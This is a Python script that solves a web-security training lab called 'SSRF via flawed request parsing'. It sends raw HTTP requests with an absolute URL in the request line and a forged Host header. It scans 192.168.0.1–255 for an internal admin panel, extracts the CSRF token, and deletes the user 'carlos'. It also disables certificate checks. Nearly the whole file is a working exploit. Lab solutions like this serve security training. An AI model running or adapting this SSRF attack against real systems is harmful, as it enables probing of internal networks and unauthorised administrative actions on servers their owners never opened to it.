# SSRF via flawed request parsing

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import ssl
import socket
from bs4 import BeautifulSoup

TIMEOUT = 5

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################


def build_request(url, lab_cookie, session_cookie, i):
	request_content = f'GET {url}/ HTTP/1.1\r\n'
	request_content += 'Cookie: _lab=' + lab_cookie + '; session=' + session_cookie + ';\r\n'
	request_content += f'Host: 192.168.0.{str(i)}\r\n'
	request_content += '\r\n'
	request_content += '\r\n'
	if i == 1:
		print('-----------------------------------------------------------------')
		print(request_content)
		print('-----------------------------------------------------------------')
	return request_content

def build_del_request(url, lab_cookie, session_cookie, i, csrf_token):
	request_body = f'username=carlos&csrf={csrf_token}'
	request_content = f'POST {url} HTTP/1.1\r\n'
	request_content += 'Cookie: _lab=' + lab_cookie + '; session=' + session_cookie + ';\r\n'
	request_content += f'Host: 192.168.0.{str(i)}\r\n'
	request_content += f'Content-Length: {str(len(request_body))}\r\n'
	request_content += 'Content-Type: application/x-www-form-urlencoded\r\n'
	request_content += '\r\n'
	request_content += request_body
	request_content += '\r\n'
	print('-----------------------------------------------------------------')
	print(request_content)
	print('-----------------------------------------------------------------')
	return request_content

def send_req(request_content, host, port):
	context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	socket.setdefaulttimeout(TIMEOUT)
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock = context.wrap_socket(sock, server_hostname=host)
	sock.connect((host, port))
	sock.sendall(request_content.encode())
	resp = sock.recv(1024 * 512)
	sock.close()
	return resp.decode()

def delete_carlos(s, url):
	print('\n[+] Trying to access to the Admin Panel on the local Network...')
	host = url.replace('https://', '')
	admin_path = url + '/admin'
	session_cookie = s.cookies['session']
	lab_cookie = s.cookies['_lab']
	for i in range(1, 256):
		cookies = {'session': session_cookie, '_lab': lab_cookie}
		headers = {'Host': '192.168.0.' + str(i)}
		sys.stdout.write('\r[+] Using Header:\t%s\r' % headers)
		req = build_request(url, lab_cookie, session_cookie, i)
		r = send_req(req, host, 443)
		if i == 1:
			print(r.split('\r\n\r\n')[0])
		time.sleep(1)
		if '302' in r:
			print(f'\n[+] Found Valid Host on the local network:\tHost: 192.168.0.{str(i)}')
			print('-----------------------------------------')
			print(req)
			print('-----------------------------------------')
			print(r.split('\r\n\r\n')[0])
			time.sleep(2)
			cookies = {'session': session_cookie, '_lab': lab_cookie}
			req = build_request(admin_path, lab_cookie, session_cookie, i)
			r = send_req(req, host, 443)
			print('-----------------------------------------')
			print(r.split('\r\n\r\n')[0])
			print('-----------------------------------------')
			time.sleep(2)
			csrf_token = re.search(r'csrf" value="(.*)">', r).group(1)
			delete_path = url + '/admin/delete'
			if '200' in r:
				print('\r\n[+] Trying to delete Carlos user...')
				del_req = build_del_request(delete_path, lab_cookie, session_cookie, i, csrf_token)
				r = send_req(del_req, host, 443)
				time.sleep(2)
				print(r)
				break
		sys.stdout.flush()

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: SSRF via flawed request parsing')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = s.get(url)
			delete_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
